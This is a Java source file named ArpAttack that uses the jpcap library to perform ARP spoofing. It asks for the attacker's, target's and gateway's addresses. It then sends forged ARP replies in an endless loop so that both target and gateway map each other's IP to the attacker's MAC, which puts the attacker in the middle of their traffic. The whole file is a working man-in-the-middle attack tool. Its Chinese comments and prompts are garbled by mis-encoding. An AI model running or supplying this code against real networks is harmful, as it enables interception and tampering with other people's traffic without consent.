import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.net.InetAddress;
import java.util.Scanner;

public class ArpAttack {
    public static void main(String[] args) throws Exception{
        int time = 1;  // �ط����ʱ��

        Scanner scanner = new Scanner(System.in);

        System.out.print("����IP��ַ��");
        InetAddress myIp = InetAddress.getByName(scanner.next());
        System.out.print("����Mac��ַ��");
        byte[] myMac = macToBytes(scanner.next());

        // Ŀ��������IP��Mac
        System.out.print("Ŀ��IP��ַ��");
        InetAddress targetIp = InetAddress.getByName(scanner.next());
        byte[] targetMac = macToBytes(NetUtil.getMacAddress(targetIp.getHostAddress()));

        // ���ص�IP��Mac
        System.out.print("����IP��ַ��");
        InetAddress wanIp = InetAddress.getByName(scanner.next());
        byte[] wanMac = macToBytes(NetUtil.getMacAddress(wanIp.getHostName()));

        System.out.println("\n-------------------------------------------------\n");

        // ö�����������豸
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        for (int i = 0; i < devices.length;i++) {
            System.out.printf("%s.%s,Mac=[%s]%n",i,
                    devices[i].description, macToStr(devices[i].mac_address));
        }
        System.out.print("\nѡ��һ��������");
        NetworkInterface device = devices[scanner.nextInt()];

        System.out.println("\n-------------------------------------------------\n");

        JpcapSender sender = JpcapSender.openDevice(device);

        // ���߰л�: ����·������ʵ����д��ȴ�Ǳ�����Mac��ַ
        ARPPacket arp1 = getARPPacket(myMac,wanIp,targetMac,targetIp);
        // ����·����: ���ǰл���ʵ����д���Ǳ�����Mac��ַ
        ARPPacket arp2 = getARPPacket(myMac,targetIp,wanMac,wanIp);
        // ����ƭĿ���ͬʱ���Լ�������ARP��Ҳ�ᱻ�ƻ������·��ʲ���·����
        // ���������������Ǹ��߱�����ȷ��IP��ַ��Ӧ��Mac��ַ
        ARPPacket arp3 = getARPPacket(wanMac,wanIp,myMac,myIp);
        ARPPacket arp4 = getARPPacket(targetMac,targetIp,myMac,myIp);

        // ����ARPӦ���
        for (int i = 1;true;i++) {
            sender.sendPacket(arp1);
            sender.sendPacket(arp2);
            sender.sendPacket(arp3);
            sender.sendPacket(arp4);

            System.out.println("�ѷ��ͣ� " + i);
            Thread.sleep(time * 1000);
        }
    }

    /**
     * mac��ַתbyte����ķ���
     */
    public static byte[] macToBytes(String s) {
        byte[] bytes = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
        String[] s1 = s.split("-");
        for (int i = 0; i < s1.length; i++) {
            bytes[i] = (byte) ((Integer.parseInt(s1[i], 16)) & 0xff);
        }
        return bytes;
    }

    /**
     * mac�ֽ�ת�ַ����ķ���
     */
    public static String macToStr(byte[] bytes) {
        StringBuilder str = new StringBuilder();
        for (int i = 0; i < bytes.length; i++) {
            str.append(Integer.toString(bytes[i] & 0xff, 16));
            if (i < bytes.length - 1) {
                str.append("-");
            }
        }
        return str.toString();
    }

    /**
     * ����ARP���ķ���
     */
    public static ARPPacket getARPPacket(byte[] sender_hardaddr, InetAddress sender_protoaddr,
                                         byte[] target_hardaddr, InetAddress target_protoaddr) {

        ARPPacket arp = new ARPPacket();

        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;
        arp.sender_hardaddr = sender_hardaddr;
        arp.sender_protoaddr = sender_protoaddr.getAddress();
        arp.target_hardaddr = target_hardaddr;
        arp.target_protoaddr = target_protoaddr.getAddress();

        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = sender_hardaddr;
        ether.dst_mac = target_hardaddr;
        arp.datalink = ether;

        return arp;
    }
}